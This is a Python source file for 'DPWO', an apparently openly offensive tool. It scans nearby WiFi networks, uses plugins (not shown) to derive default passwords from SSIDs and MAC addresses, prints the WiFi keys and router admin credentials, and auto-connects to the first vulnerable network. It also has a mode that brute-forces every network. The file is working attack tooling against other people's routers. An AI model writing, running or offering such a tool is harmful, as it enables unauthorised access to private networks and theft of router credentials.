# -*- coding: utf-8 -*-
import argparse
import importlib.machinery
import importlib.util
import os
import subprocess
import sys

from tqdm import tqdm
from wifi import Cell, Scheme

'''
DPWO
Default Password Wifi Owner 0.4v
python3
'''

AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"


class NETOwner():
    def __init__(self, iface, connect=False,brute = False,
                 airport=AIRPORT_PATH, verbosity=0):
        self.iface = iface
        self.brute = brute
        self.connect = connect
        self.airport = airport
        self.verbosity = verbosity
        self.os = sys.platform
        self.plugins = self.load_plugins()

    def load_plugins(self) :
        plugin_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "plugins")
        plugins = []

        try:
            possible_plugins = os.listdir(plugin_folder)
        except OSError as e:
            print(f"Error: Could not load plugins from {plugin_folder}: {e}")
            return plugins

        for f in possible_plugins :
            location = os.path.join(plugin_folder,f)

            if not f.endswith('.py') or not os.path.isfile(location):
                continue

            try:
                spec = importlib.util.spec_from_file_location(f[:-3], location)
                p = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(p)
                plugins.append(p)
            except Exception as e:
                print(f"Warning: Failed to load plugin {f}: {e}")

        return plugins

    def osx_networks(self):
        scan = ""
        while scan == "":  # for some reason airport fails randomly
            scan = subprocess.check_output([self.airport, "scan"]).decode()
            # scan the area for wifi
        scan = scan.encode('ascii','ignore')
        scan = scan.decode().split("\n")

        n_spaces = scan[0].split("SSID")[0].count(" ")+4

        scan.pop(0) # remove header

        for wifi in scan:
            obj_t = str.split(wifi)
            if len(obj_t) < 1 :
                continue
            obj = [ wifi[:n_spaces].replace(" ",''), 
                    wifi[n_spaces:].split()[0] ]

            if len(obj) > 0:
                yield obj

    def linux_networks(self):
        try:
            scan = Cell.all(self.iface)
        except Exception as e:
            print(f"Error scanning with interface '{self.iface}': {e}")
            return

        for wifi in scan:
            obj = [wifi.ssid, wifi.address, wifi.signal, wifi.channel, wifi]
            yield obj

    def scan_network(self):
        if self.os == "linux" or self.os == "linux2":
            scanner = self.linux_networks()
        elif self.os == "darwin":
            scanner = self.osx_networks()
        else:
            print(f"Error: Unsupported platform '{self.os}'.")
            return []

        results = []
        for wifi in scanner :

            if self.verbosity > 1:
                tqdm.write(str(wifi))

            # match SSID/MAC to a plugin
            for p in self.plugins : 
                if self.brute and p.__name__ == "brute" :
                    for b in p.own(wifi[0],wifi[1]) :
                        results.append(b)
                elif p.is_vuln(wifi[0],wifi[1]) : 
                    results.append(p.own(wifi[0],wifi[1]))

        return results

    def connect_net(self, wifi):
        try:
            if self.os == "linux" or self.os == "linux2":
                status = self.connect_net_linux(wifi)
            elif self.os == "darwin":
                status = self.connect_net_osx(wifi)
            else:
                print(f"Error: Connection not supported on '{self.os}'.")
                return False

            return status
        except (subprocess.CalledProcessError, OSError) as e:
            if self.verbosity > 0:
                tqdm.write(f"Connection error: {e}")
            return False

    def connect_net_osx(self, wifi):
            connect = subprocess.check_output([
                "networksetup", "-setairportnetwork",
                self.iface, wifi['ssid'], wifi['wifi_password']
            ]).decode()

            if self.verbosity > 0:
                tqdm.write(connect)

            return "Failed" not in connect and "Could not" not in connect

    def connect_net_linux(self, wifi):
        return Scheme.find(self.iface, wifi[1]).activate()

    def own(self):

        wifi_available = self.scan_network()

        if len(wifi_available) == 0:
            print("No WiFi available :'(")
        else:
            connected = False
            for wifi in tqdm(wifi_available):
                tqdm.write("WI-FI: " + wifi["ssid"])
                tqdm.write("Password: " + wifi["wifi_password"])

                if self.verbosity > 0:
                    if wifi["admin_login"] and wifi["admin_password"] : 
                        tqdm.write("Admin credentials of the router: ")
                        tqdm.write("User: " + wifi["admin_login"])
                        tqdm.write("Password: " + wifi["admin_password"])

                if not connected and self.connect:
                    tqdm.write("Trying to connect...")
                    if self.connect_net(wifi):
                        tqdm.write("Connected! Have fun (:")
                        if not self.brute :
                            connected = True
                    else:
                        tqdm.write("Nope :(")


def parse_args():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument("-i", "--interface", default="wlp3s0",
                        help="Network interface.")
    parser.add_argument("-b", "--brute",action='store_true', default=False,
                        help="Bruteforce all networks unregarding the SSID.")
    parser.add_argument("-d", "--disable", action="store_false", default=True,
                        help="Disable autoconnect to the first vulnerable network.")
    parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
                        help="Airport program path.")
    parser.add_argument("-v", "--verbosity", action="count",
                        help="Increase output verbosity.")
    args = parser.parse_args()

    return args


def main():
    print("DPWO      v0.4")
    print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")

    args = parse_args()

    owner = NETOwner(
        args.interface,
        connect=args.disable,
        brute=args.brute,
        airport=args.airport,
        verbosity=args.verbosity or 0
    )

    owner.own()


if __name__ == "__main__":
    main()
